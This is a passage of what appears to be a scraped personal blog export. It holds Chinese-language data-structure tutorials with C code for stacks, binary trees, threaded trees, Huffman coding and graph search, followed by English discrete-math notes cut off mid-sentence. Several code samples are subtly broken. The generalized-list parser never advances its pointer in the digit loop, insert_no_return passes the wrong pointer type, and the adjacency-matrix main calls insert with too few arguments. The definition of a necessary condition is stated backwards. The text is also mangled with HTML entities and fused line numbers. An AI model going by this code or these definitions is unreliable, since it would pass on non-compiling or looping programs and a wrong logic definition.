Node_p p = s-&gt;head-&gt;next; while (p) &#123; (p != s-&gt;head-&gt;next) &amp;&amp; printf(\" \"); printf(\"%d\", p-&gt;val); p = p-&gt;next; &#125; printf(\"\\n\");&#125;int main() &#123; srand(time(NULL)); Stack_p s = initStack(); int cnt = 20; while (cnt--) &#123; int val = rand() % 100; int opt = rand() % 4; switch (opt) &#123; case 0: case 1: case 2: printf(\"push %d, %s\\n\", val, push(s, val) ? \"SUC\": \"ERROR\"); showStack(s); break; case 3: empty(s) ? printf(\"Nothing to pop.\\n\") : printf(\"Pop.\\n\"); pop(s); showStack(s); break; &#125; &#125; printf(\"\\nFinal: \\n\"); showStack(s); return 0;&#125; 树 定义 基本概念 分支度：节点拥有的子节点个数。 阶层：从根节点层往下，阶层从 1 往下依次增加。 高度（深度）：树的最大阶层值。⾼度和深度是相反的， ⾼度是从下往上数， 深度是从上往 下。 因此根节点的深度和叶⼦节点的⾼度是 1。 祖先：某节点到根节点的路径上所有节点都是该节点祖先。 树林：多个数的集合。 歪斜树：所有节点只有左孩子，左歪斜树。右歪斜树同理。 满二叉树 一个二叉树，如果每一个层的结点数都达到最大值，则这个二叉树就是满二叉树。 也就是说，如果一个二叉树的层数为 k，且结点总数是\\(2^k -1\\) ，则它就是满二叉树。 完全二叉树 一棵深度为k的有n个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为i（1≤i≤n）的结点与满二叉树中编号为i的结点在二叉树中的位置相同，则这棵二叉树称为完全二叉树。 性质 二叉树第 i 层对多 \\(2^{i-1}\\) 个节点。 层数为 k 的满二叉树节点数为 \\(2^k -1\\)。 二叉树中，终端节点个数，等于度数为 2 的节点个数 + 1。 遍历 先序遍历时，遍历的顺序是从根结点开始，先访问当前结点，如果左子树不为空则继续访问左子树，之后若右子树不为空再访问右子树。在左右子树中依然按照这样的顺序进行遍历。 中序遍历的顺序是从当前结点的左子树开始遍历，再访问当前结点，最后访问右子树。 后序遍历先访问当前结点的左子树，再访问右子树，最后访问当前结点。 简单实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node &#123; int data; struct Node *lchild, *rchild;&#125; Node;typedef struct Tree &#123; int len; Node *root;&#125; Tree;Node* init(int data) &#123; Node *node =(Node *)malloc(sizeof(Node)); node-&gt;data = data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; return node;&#125;// 保持二叉搜索树结构，插入值Node *insert(Node *root, int val) &#123; if (!root) &#123; Node *n = init(val); return n; &#125; if (root-&gt;data &lt; val) &#123; root-&gt;rchild = insert(root-&gt;rchild, val); &#125; else &#123; root-&gt;lchild = insert(root-&gt;lchild, val); &#125; return root;&#125;// 保持二叉搜索树结构，插入值. 不返回指针，直接在原地址中操作。void insert_no_return(Node **raddr, int val) &#123; if (!(*raddr)) &#123; *raddr = init(val); return; &#125; if ((*raddr)-&gt;data &lt; val) &#123; (*raddr)-&gt;rchild = insert(&amp;((*raddr)-&gt;rchild), val); &#125; else &#123; (*raddr)-&gt;lchild = insert(&amp;((*raddr)-&gt;lchild), val); &#125; return;&#125;void insert_tree(Tree *t, int val) &#123; if (!t) return; t-&gt;root = insert(t-&gt;root, val); t-&gt;len++;&#125;Node* build_demo() &#123; Node *node = init(1); node-&gt;lchild = init(2); node-&gt;rchild = init(3); node-&gt;lchild-&gt;lchild = init(4); node-&gt;lchild-&gt;rchild = init(5); node-&gt;rchild-&gt;rchild = init(6); return node;&#125;void preorder(Node *node) &#123; printf(\"%d \", node-&gt;data); if (node-&gt;lchild != NULL) &#123; preorder(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; preorder(node-&gt;rchild); &#125;&#125;void inorder(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; inorder(node-&gt;lchild); &#125; printf(\"%d \", node-&gt;data); if (node-&gt;rchild != NULL) &#123; inorder(node-&gt;rchild); &#125;&#125;void postorder(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; postorder(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; postorder(node-&gt;rchild); &#125; printf(\"%d \", node-&gt;data);&#125;void clear(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; clear(node-&gt;rchild); &#125; free(node);&#125;void clear_tree(Tree *t) &#123; if (t-&gt;root) clear(t-&gt;root); free(t); return;&#125; 已知先序和中序求后序遍历 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct Node &#123; int data; struct Node *lchild, *rchild;&#125; Node;Node* init(int data) &#123; Node *node =(Node *)malloc(sizeof(Node)); node-&gt;data = data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; return node;&#125;void postorder(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; postorder(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; postorder(node-&gt;rchild); &#125; printf(\"%d \", node-&gt;data);&#125;// 根据先序和中序建立二叉树的函数 buildNode *build(char pre_str[], char in_str[], int len) &#123; Node *p = init(pre_str[0] - '0'); int pos = strchr(in_str, pre_str[0]) - in_str; if (pos &gt; 0) &#123; p-&gt;lchild = build(pre_str + 1, in_str, pos); &#125; if (len - pos - 1 &gt; 0) &#123; p-&gt;rchild = build(pre_str + pos + 1, in_str + pos + 1, len - pos - 1); &#125; return p;&#125;void clear(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; clear(node-&gt;rchild); &#125; free(node);&#125;int main() &#123; char pre_str[] = \"136945827\"; char in_str[] = \"963548127\"; Node *root = build(pre_str, in_str, strlen(pre_str)); postorder(root); printf(\"\\n\"); clear(root); return 0;&#125; Huffman编码 1952 年由 David A. Huffman 提出的一种无损数据压缩的编码算法。 哈夫曼编码先统计出每种字母在字符串里出现的频率，根据频率建立一棵路径带权的二叉树，也就是哈夫曼树。 树上每个结点存储字母出现的频率，根结点到结点的路径即是字母的编码，频率高的字母使用较短的编码，频率低的字母使用较长的编码，这样使得编码后的字符串占用空间最小。 实现方法 首先统计每个字母在字符串里出现的频率，把每个字母看成一个结点，结点的权值即是字母出现的频率。 把每个结点看成一棵只有根结点的二叉树，一开始把所有二叉树（结点）都放在一个集合里，接下来开始如下编码： 步骤一：从集合里取出两个根结点权值最小的树a和b，构造出一棵新的二叉树c，二叉树c的根结点的权值为a和b的根结点权值和，二叉树c的左右子树分别是a和b。（合并） 步骤二：将二叉树a和b从集合里删除，把二叉树c加入集合里。（更新候选） 重复以上两个步骤，直到集合里只剩下一棵二叉树，最后剩下的就是哈夫曼树了。 规定每个有孩子的结点，到左孩子的路径为 0，到右孩子的路径为 1。每个字母的编码就是根结点到字母对应结点的路径。 广义表 示例： 广义表为：(5 ( 3 ( 1, 4 ), 6 (, 8 ( 7, ) ) ) ) 实现根据广义表输入，构建树。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576...// 上接树的实现 #include &lt;string.h&gt;// 栈处理广义表typedef struct Stack &#123; Node **elements; int max_size, top_index;&#125; Stack;Stack *init_stack(int length) &#123; Stack *s = (Stack *)malloc(sizeof(Stack)); s-&gt;elements = (Node **)malloc(sizeof(Node *) * length); s-&gt;max_size = length; s-&gt;top_index = -1; return s;&#125;void freeStack(Stack *s) &#123; if (!s) return; free(s-&gt;elements); free(s);&#125;int push(Stack *s, Node *n) &#123; if (!s) return 0; if (s-&gt;top_index == s-&gt;max_size - 1) return 0; s-&gt;elements[++s-&gt;top_index] = n; return 1;&#125;int is_empty(Stack *s) &#123; return !(s &amp;&amp; s-&gt;top_index != -1);&#125;Node *pop(Stack *s) &#123; return s-&gt;elements[s-&gt;top_index--];&#125;Node *build_tree(char *str) &#123; Stack *s = init_stack(100); Node *root, *n; int flag = 0; while(str[0]) &#123; switch (str[0]) &#123; case '(': push(s, n); flag = 0; break; case ',': flag = 1; break; case ')': root = pop(s); break; default: if (str[0] &lt; '0' || str[0] &gt; '9') break; int num = 0; while (str[0] &gt;= '0' &amp;&amp; str[0] &lt;= '9') &#123; num = num * 10 + (str[0] - '0'); &#125; str--; n = init(num); if (!is_empty(s)) flag ? (s-&gt;elements[s-&gt;top_index]-&gt;rchild = n) : \\ (s-&gt;elements[s-&gt;top_index]-&gt;lchild = n); &#125; ++str; &#125; freeStack(s); return root;&#125; 线索二叉树 利用叶子节点的空指针，建立所需要的前驱后继结构。比如下面实现中序遍历的前驱后继。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;// ltag 和 rtag 表示节点的左右孩子是普通孩子节点还是前驱后继节点。// 前驱后继节点，将叶子节点的空指针孩子指向中序遍历的前驱后继节点。enum &#123; CHILD = 0, THREAD = 1&#125;;typedef struct Node &#123; int val; struct Node *lchild; struct Node *rchild; int rtag, ltag;&#125; Node;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;lchild = NULL; n-&gt;rchild = NULL; n-&gt;ltag = CHILD; n-&gt;rtag = CHILD; return n;&#125;void freeNode(Node *n) &#123; if (!n) return; free(n); return;&#125;Node *insert(Node *root, int val) &#123; if (!root) return initNode(val); if (val &gt; root-&gt;val) root-&gt;rchild = insert(root-&gt;rchild, val); else root-&gt;lchild = insert(root-&gt;lchild, val); return root;&#125;void freeTree(Node *root) &#123; if (!root) return; if (root-&gt;rtag == CHILD) freeTree(root-&gt;rchild); if (root-&gt;ltag == CHILD) freeTree(root-&gt;lchild); freeNode(root); return;&#125;void inorder(Node *root) &#123; if (!root) return; if (root-&gt;ltag == CHILD) inorder(root-&gt;lchild); if (root-&gt;rtag == CHILD) printf(\"%d \", root-&gt;val); inorder(root-&gt;rchild); return;&#125;// 线索二叉树Node *pre = NULL;// 类似inordoer的遍历方法，同时更新叶子节点的前驱和后继void build_thread_tree(Node *root) &#123; if (!root) return; build_thread_tree(root-&gt;lchild); // 更新当前节点（叶子节点）的前驱，及前驱节点的后继。 if (root-&gt;lchild == NULL) &#123; root-&gt;lchild = pre; root-&gt;ltag = THREAD; &#125; if (pre &amp;&amp; !pre-&gt;rchild) &#123; pre-&gt;rchild = root; pre-&gt;rtag = THREAD; &#125; pre = root; build_thread_tree(root-&gt;rchild);&#125;Node *getLeftMost(Node *n) &#123; while (n &amp;&amp; n-&gt;ltag == CHILD &amp;&amp; n-&gt;lchild) n = n-&gt;lchild; return n;&#125;void output(Node *root) &#123; if (!root) return; Node *n = getLeftMost(root); while (n) &#123; printf(\"%d \", n-&gt;val); if (n-&gt;rtag == CHILD) n = getLeftMost(n-&gt;rchild); // 非叶子节点，符合中序遍历 else n = n-&gt;rchild; // 后继 &#125;&#125;int main() &#123; srand(time(NULL)); Node *root = NULL; int cnt = 10; printf(\"Input : \"); while (cnt--) &#123; int val = rand() % 100; printf(\"%d \", val); root = insert(root, val); &#125; printf(\"\\n\"); printf(\"Inorder output: \"); inorder(root); printf(\"\\n\"); printf(\"Thread output : \"); build_thread_tree(root); output(root); printf(\"\\n\"); freeTree(root); return 0;&#125; 图 一个图有很少边（如 \\(e &lt; n\\log (n)\\)，e 指边数，n 指点数）的图称为稀疏图，反之称为稠密图。 顶点的 度 是指依附于某个顶点的边数。 入度 是以该顶点为终点的弧的数目，出度 是以该顶点为起点的弧的数目。 稀疏图，一般用邻接表来存储，这样可以节省空间；如果是稠密图，一般用邻接矩阵来存储。 邻接矩阵 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_N 500typedef struct Graph &#123; int mat[MAX_N][MAX_N]; int n;&#125; Graph;void init(Graph *g, int n) &#123; g-&gt;n = n; memset(g-&gt;mat, 0, sizeof(g-&gt;mat));&#125;void insert(Graph *g, int a, int x, int y) &#123; if (x &lt; 0 || x &gt;= g-&gt;n || y &lt; 0 || y &gt;= g-&gt;n) &#123; return ; &#125; if (a) &#123; g-&gt;mat[x][y] = 1; g-&gt;mat[y][x] = 1; &#125; else &#123; g-&gt;mat[x][y] = 1; &#125;&#125;void output(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; for (int j = 0; j &lt; g-&gt;n; ++j) &#123; (j) &amp;&amp; printf(\" \"); printf(\"%d\", g-&gt;mat[i][j]); &#125; (i &lt; g-&gt;n - 1) &amp;&amp; printf(\"\\n\"); &#125;&#125;int main() &#123; int n, m, x, y; scanf(\"%d %d\", &amp;n, &amp;m); Graph *graph = (Graph *)malloc(sizeof(Graph)); init(graph, n); for (int i = 0; i &lt; m; ++i) &#123; scanf(\"%d %d\", &amp;x, &amp;y); insert(graph, x, y); &#125; output(graph); free(graph); return 0;&#125; 邻接表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_N 10000typedef struct Node &#123; int vertex; struct Node *next;&#125; Node, *LinkedList;LinkedList insert_node(LinkedList head, int index) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;vertex = index; node-&gt;next = head; head = node; return head;&#125;typedef struct Graph &#123; int n; LinkedList edges[MAX_N];&#125; Graph;void init(Graph *g, int n) &#123; g-&gt;n = n; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;edges[i] = NULL; &#125;&#125;void insert(Graph *g, int a, int x, int y) &#123; if (x &lt; 0 || x &gt;= g-&gt;n || y &lt; 0 || y &gt;= g-&gt;n) &#123; return ; &#125; if (a) &#123; g-&gt;edges[x] = insert_node(g-&gt;edges[x], y); g-&gt;edges[y] = insert_node(g-&gt;edges[y], x); &#125; else &#123; g-&gt;edges[x] = insert_node(g-&gt;edges[x], y); &#125;&#125;void output(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; printf(\"%d:\", i); for (Node *j = g-&gt;edges[i]; j != NULL; j = j-&gt;next) &#123; printf(\" %d\", j-&gt;vertex); &#125; (i &lt; g-&gt;n - 1) &amp;&amp; printf(\"\\n\"); &#125;&#125;void clear(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; Node *head = g-&gt;edges[i]; while (head != NULL) &#123; Node *delete_node = head; head = head-&gt;next; free(delete_node); &#125; &#125; free(g);&#125;int main() &#123; int n, m, a, x, y; scanf(\"%d %d\", &amp;n, &amp;m); Graph *graph = (Graph *)malloc(sizeof(Graph)); init(graph, n); for (int i = 0; i &lt; m; ++i) &#123; scanf(\"%d %d %d\", &amp;a, &amp;x, &amp;y); insert(graph, a, x, y); &#125; output(graph); clear(graph); return 0;&#125; 图搜索 深度优先 从开始节点，遍历相邻节点，若该节点没有被访问过，递归遍历其相邻节点。遇到没有遍历的，就向下递归。 利用邻接表实现DFS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_N 10000typedef struct Node &#123; int vertex; struct Node *next;&#125;Node, *LinkedList;LinkedList insert_node(LinkedList head, int index) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;vertex = index; node-&gt;next = head; head = node; return head;&#125;typedef struct Graph &#123; LinkedList edges[MAX_N]; int n; int visited[MAX_N];&#125;Graph;void init(Graph *g, int n) &#123; g-&gt;n = n; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;edges[i] = NULL; &#125; memset(g-&gt;visited, 0, sizeof(g-&gt;visited));&#125;void insert(Graph *g, int x, int y) &#123; if (x &lt; 0 || x &gt;= g-&gt;n || y &lt; 0 || y &gt;= g-&gt;n) &#123; return ; &#125; g-&gt;edges[x] = insert_node(g-&gt;edges[x], y); g-&gt;edges[y] = insert_node(g-&gt;edges[y], x);&#125;void clear(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; Node *head = g-&gt;edges[i]; while (head != NULL) &#123; Node *delete_node = head; head = head-&gt;next; free(delete_node); &#125; &#125; free(g);&#125;void dfs(Graph *g, int vertex) &#123; printf(\"%d\\n\", vertex); g-&gt;visited[vertex] = 1; for (Node *adj = g-&gt;edges[vertex]; adj != NULL; adj = adj-&gt;next) &#123; if (!g-&gt;visited[adj-&gt;vertex]) &#123; dfs(g, adj-&gt;vertex); &#125; &#125;&#125;int main() &#123; int n, m, k; scanf(\"%d %d\", &amp;n, &amp;m); Graph *graph = (Graph *)malloc(sizeof(Graph)); init(graph, n); for (int i = 0; i &lt; m; ++i) &#123; int x, y; scanf(\"%d %d\", &amp;x, &amp;y); insert(graph, x, y); &#125; scanf(\"%d\", &amp;k); dfs(graph, k); clear(graph); return 0;&#125; 广度优先 先遍历完一个节点的所有相邻节点，再遍历相邻节点的相邻节点。 使用 queue 实现广度优先搜索。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_N 10000typedef struct Queue &#123; int *data; int head, tail, length;&#125; Queue;void init_queue(Queue *q, int length_input) &#123; q-&gt;data = (int *)malloc(sizeof(int) * length_input); q-&gt;length = length_input; q-&gt;head = 0; q-&gt;tail = -1;&#125;void push(Queue *q, int element) &#123; if (q-&gt;tail + 1 &lt; q-&gt;length) &#123; q-&gt;tail++; q-&gt;data[q-&gt;tail] = element; &#125;&#125;int front(Queue *q) &#123; return q-&gt;data[q-&gt;head];&#125;void pop(Queue *q) &#123; q-&gt;head++;&#125;int empty(Queue *q) &#123; if (q-&gt;head &gt; q-&gt;tail) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;void clear_queue(Queue *q) &#123; free(q-&gt;data); free(q);&#125;typedef struct Node &#123; int vertex; struct Node *next;&#125;Node, *LinkedList;LinkedList insert_node(LinkedList head, int index) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;vertex = index; node-&gt;next = head; head = node; return head;&#125;typedef struct Graph &#123; LinkedList edges[MAX_N]; int visited[MAX_N]; int n;&#125;Graph;void init_graph(Graph *g, int n) &#123; g-&gt;n = n; memset(g-&gt;visited, 0, sizeof(g-&gt;visited)); for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;edges[i] = NULL; &#125;&#125;void insert(Graph *g, int x, int y) &#123; if (x &lt; 0 || x &gt;= g-&gt;n || y &lt; 0 || y &gt;= g-&gt;n) &#123; return ; &#125; g-&gt;edges[x] = insert_node(g-&gt;edges[x], y); g-&gt;edges[y] = insert_node(g-&gt;edges[y], x);&#125;void clear_graph(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; Node *head = g-&gt;edges[i]; while (head != NULL) &#123; Node *delete_node = head; head = head-&gt;next; free(delete_node); &#125; &#125; free(g);&#125;void bfs(Graph *g, int start_vertex) &#123; Queue *queue = (Queue *)malloc(sizeof(Queue)); init_queue(queue, g-&gt;n); push(queue, start_vertex); g-&gt;visited[start_vertex] = 1; while (!empty(queue)) &#123; int vertex = front(queue); printf(\"%d\\n\", vertex); pop(queue); for (Node *adj = g-&gt;edges[vertex]; adj != NULL; adj = adj-&gt;next) &#123; if (!g-&gt;visited[adj-&gt;vertex]) &#123; g-&gt;visited[adj-&gt;vertex] = 1; push(queue, adj-&gt;vertex); &#125; &#125; &#125; clear_queue(queue);&#125;int main() &#123; int n, m, k; scanf(\"%d %d\", &amp;n, &amp;m); Graph *graph = (Graph *)malloc(sizeof(Graph)); init_graph(graph, n); for (int i = 0; i &lt; m; ++i) &#123; int x, y; scanf(\"%d %d\", &amp;x, &amp;y); insert(graph, x, y); &#125; scanf(\"%d\", &amp;k); bfs(graph, k); clear_graph(graph); return 0;&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Data Structure","slug":"Notes/Data-Structure","permalink":"https://racleray.github.io/categories/Notes/Data-Structure/"}],"tags":[{"name":"data structure","slug":"data-structure","permalink":"https://racleray.github.io/tags/data-structure/"},{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"}],"author":"HeRui"},{"title":"离散数学","slug":"离散数学","date":"2021-10-03T12:54:44.000Z","updated":"2023-08-07T11:54:31.048Z","comments":true,"path":"posts/fbbb19a4.html","link":"","permalink":"https://racleray.github.io/posts/fbbb19a4.html","excerpt":"Brief summary notes about discrete math.","text":"Representation Set: no order set roster notation: \\(\\{1, 2, 3\\}\\) set builder notation: \\(\\{x|P(x)\\}\\), P means Property Empty set: \\(\\phi \\subset \\{1,2,3\\}\\) is vacuously true. （空真） Ordered Pairs (a, b, c): order matters a, b, c : can be different type of elements Cartesian Product: 笛卡尔积 \\(A × B\\) ： is all ordered pairs (a, b) where a \\(\\in\\) A, b \\(\\in\\) B. \\(\\{a,b\\} × \\{0,1\\}\\) = { (a, 0), (a, 1), (b, 0), (b, 1) } A point in a two-dimensional coordinate system can be represented by \\(R \\times R\\). 二维坐标系中的点可表示为 \\(R \\times R\\) Relations Def: ​ A relation R between A and B is a subset of \\(A \\times B\\). Function Def: ​ A function F between A and B is a relation between A and B such that: for every \\(x \\in A\\) there is a \\(y \\in B\\) such that \\((x,y) \\in F\\) if \\((x,y)\\in F \\ and \\ (x,z) \\in F\\) then \\(y=z\\) Ex: \\(x^2 + y^2 = 1\\) is not a function in Discrete Math domain definition. Statement Def: ​ A sentence that is either True or False. Combine Form: \\(\\lnot p\\) \\(p \\land q\\) \\(p\\lor q\\) Ex 1: ​ \"My shirt is gray but my shorts are not.\" ​ p: \"my shirt is gray\", q: \"my shorts are gray\" ​ ~q: \"my shorts are not gray\" ​ the result logic form: \\(p \\land \\lnot q\\) Truth table p q \\(\\lnot p\\) \\(p \\land q\\) \\(p\\lor q\\) T T F T T T F F F T F T T F T F F T F F Logically equivalent Def: ​ Two statements have the same truth table. Ex: \\(p \\equiv \\lnot(\\lnot p)\\) Tautology Def: ​ A tautology is a statement that is always True. Contradiction Def: ​ A contradiction is a statement that is always False. Basic Laws Obvious but useful DeMorgan`s Law: \\(\\lnot(p \\land q) \\equiv (\\lnot p) \\lor (\\lnot) q\\) \\(\\lnot(p \\lor q) \\equiv (\\lnot p) \\land (\\lnot) q\\) Identity Laws: \\(p \\lor contradiction \\equiv p\\) \\(p \\land tautology \\equiv p\\) Universal Bound Laws: \\(p \\land contradiction \\equiv contradiction\\) \\(p \\lor tautology \\equiv tautology\\) Ex: \\[ \\begin{align*} (\\lnot(p \\lor \\lnot q)) \\land tautology(t) &amp; \\\\ (DeMorgan`s\\ Law) &amp; \\equiv (\\lnot p \\land \\lnot(\\lnot q)) \\land t \\\\ (Double\\ Negative) &amp; \\equiv (\\lnot p \\land q) \\land t \\\\ (Identity) &amp; \\equiv \\lnot p \\land q \\end{align*} \\] Conditional statements Def: ​ \\(p \\to q\\) means \"if p is True then q is True\" p q \\(p \\to q\\) \\(\\lnot p \\lor q\\) T T T T T F F F F T T(vacuously true) T F F T(vacuously true) T If p is false, then I didn`t have a assumption indeed. Think it as a vacuously true statement. Vacuously true statement When the hypothesis (\\(p\\)) is false. Ex: if I am a pig, then the world will be better. ​ equal form: Either I am not a pig, or the world will be better. ​ \"I am not a pig.\". It is vacuously true, anyway. So the whole statement is True. Negating a conditional \\(\\lnot (p \\to q) \\equiv \\lnot (\\lnot p \\lor q)\\) \\[ \\begin{align*} \\lnot (\\lnot p \\lor q) &amp; \\equiv (\\lnot \\lnot p \\land \\lnot q) \\\\ &amp; \\equiv p \\land \\lnot q \\end{align*} \\] Contrapositive of a statement Def: ​ \\(p \\to q \\equiv \\lnot q \\to \\lnot p\\) equal form: \\(\\lnot p \\lor q \\equiv q \\lor \\lnot p\\) Converse of a statement Def: ​ Converse of \\(p \\to q\\) is \\(q \\to p\\). Not necessarily logically equivalent. Inverse of a statement Def: ​ Inverse of \\(p \\to q\\) is \\(\\lnot p \\to \\lnot q\\). Cause the contrapositive is \\(\\lnot q \\to \\lnot p\\) which is the converse of \\(\\lnot p \\to \\lnot q\\), so: the inverse of \\(p \\to q\\) is the converse of the contrapositive of \\(p \\to q\\). Biconditional Def: ​ \\(p \\leftrightarrow q\\) means \\(p \\to q\\) and \\(q \\to p\\). Ex: I will pass the exam if and only if I study hard. ​ It means biconditional. Logic Arguments Def: ​ A valid argument is a list of premises from which the conclusion follows. premises: statements. Modus Ponens: 肯定前件推理 if \\(p\\), then \\(q\\) \\(p\\) therefore \\(q\\) p q \\(p \\to q\\)(premises) p(premises) conclusion T T T T T T F F \\(\\boxtimes\\) \\(\\boxtimes\\) F T T \\(\\boxtimes\\) \\(\\boxtimes\\) F F T \\(\\boxtimes\\) \\(\\boxtimes\\) We focus on where premises is true. Modus Tollens: 否定后件推理 if \\(p\\), then \\(q\\) \\(\\lnot q\\) therefore \\(\\lnot p\\) We focus on where premises is true. Generalization \\(p\\) (True) therefore, \\(p \\lor q\\) Specialization \\(p \\land q\\) (True) therefore, \\(p\\) Contradiction \\(\\lnot p \\to contradiction\\) therefore, \\(p\\) Predicate Def: ​ A predicate(谓词) is a statement depending on variables which becomes a statement upon substituting values in the domain. Ex: ​ P(x): x is the variable that is a factor of 12 with domain \\(Z^+\\). P(x) is a predicate. When x = 6, P(6) is True. When x = 7, P(7) is False. True set Def: ​ It is a predicate P(x) satisfies that \\(\\{x \\in D | P(x)\\ is\\ True\\}\\) Universal Quantifier \\(\\forall\\) means \"for all\". \\(\\forall x \\in D, P(x)\\) means: For all x in domain D, \\(P(x)\\) is True. Ex: ​ Every dog is mammal. D is the dog domain, P(x) means x is a mammal. Existential Quantifier \\(\\exists\\) mean \"there exists\" \\(\\exists x \\in D, P(x)\\) means: There exists x in the domain, such that P(x) is True. Ex: ​ Some person is the oldest in the world. D is people in the world. P(x) means that x is the oldest. Summary P: \"The earth is round.\" -&gt; Statement P(x): \"x is round.\" -&gt; Predicate Q: \\(\\forall x \\in D, P(x)\\): \"Every dog is a mammal.\" -&gt; Statement Q: \\(\\exists x \\in D, P(x)\\): \"Some person is the oldest in the world.\" -&gt; Statement Negate Quantifier For example, we have \"\\(\\forall x \\in Z^+, x &gt; 4\\)\". Negate the quantifier: \\[ \\lnot(\\forall x \\in D, P(x)) \\equiv (\\exists x \\in D, \\lnot P(x)) \\] So, for the example, we have \"\\(\\exists x \\in Z^+, x \\leqslant 4\\)\". Ex: ​ Every integer has a larger integer. It is \\(\\forall x \\in Z, P(x): (\\exists y \\in Z, P(y): (y &gt; x))\\). Negate it, we have \\(\\exists x \\in Z, (\\forall y \\in Z, y \\leqslant x)\\), which can`t be True. Ex: ​ Some number in D is the largest. It is \\(\\exists x \\in D, (\\forall y \\in D, x \\geqslant y)\\). Negate it, we have \\(\\forall x \\in D, (\\exists y \\in D, x &lt; y)\\) Conditional Predicate Universal-Conditionals Def: ​ \\(P(x) \\Rightarrow Q(x)\\) means \\(\\forall x \\in D, P(x) \\to Q(x)\\ is\\ True\\). Ex: ​ If x is a dog, then x is a mammal. D maybe all possible animals. Sufficient Condition Def: ​ If \\(A(x)\\) , then \\(B(x)\\). We have \\(A(x)\\) is a sufficient condition for \\(B(x)\\). Necessary Condition Def: ​ If $ A(x)$ , then $ B(x)$. We have \\(A(x)\\) is a necessary condition for \\(B(x)\\). Use contrapositive statement to explain above definition. Proof Precisely define even &amp; odd integers n is even integer if \\(\\exists k \\in Z\\), such that \\(n=2k\\). n is odd integer if \\(\\exists k \\in Z\\), such that \\(n=2k+1\\). Theorem 1 to proof An even integer plus an odd integer is another odd integer. Proof Assumption: ​ Suppose m is even and n is odd. Definitions: ​ \\(\\exists k_1 \\in Z \\ and \\ \\exists k_2 \\in Z\\) , so that \\(m = 2*k_1\\) and \\(n=2*k_2+1\\). Manipulate: Then, \\[ \\begin{align*} m+n &amp; = 2k_1+2k_2+1 \\\\ &amp; = 2(k_1+k_2) + 1 \\end{align*} \\] Definitions: Thus, ​ \\(\\exists k_3 \\in Z\\) so that \\(m+n=2k_3+1\\). Conclusion: ​ Thus \\(m+n\\) is odd. Theorem 2 to proof An even integer times an even integer is another even integer. Proof: Formally stated theorem: ​ \\(\\forall m,n \\in Z\\) if m, n are even, then \\(mn\\) is even. Assumption: ​ Suppose m, n are even. Definition: ​ \\(\\exists k_1, k_2 \\in Z\\) so that \\(m = 2k_1, n=2k_2\\). Manipulation: \\[ \\begin{align*} mn &amp; = 2k_1 *2k_2 \\\\ &amp; = 2(2*k_1*k_2) \\end{align*} \\] Definition: ​ Let t = \\(2k_1k_2\\), \\(t \\in Z\\). Conclusion: ​ Thus, \\(mn\\) is even. Proof by counterexample Aim is prove \\(P(x) \\Rightarrow Q(x)\\) is false. To do that find one \\(a \\in D\\) where \\(P(a) \\land \\lnot Q(a)\\) is true. Proof by division into class Divide the theorem into different cases. Proof by contradiction Suppose \\(\\lnot p\\) is true; Find a contradiction like 0 = 1; Therefore, \\(p\\) is true. \\(\\lnot p \\to contradiction\\) therefore, \\(p\\) Proof by contrapositive \\(p \\to q \\equiv \\lnot q \\to \\lnot p\\) Goal: prove \\(P(x) \\Rightarrow Q(x)\\). Instead, prove: \\(\\lnot Q(x) 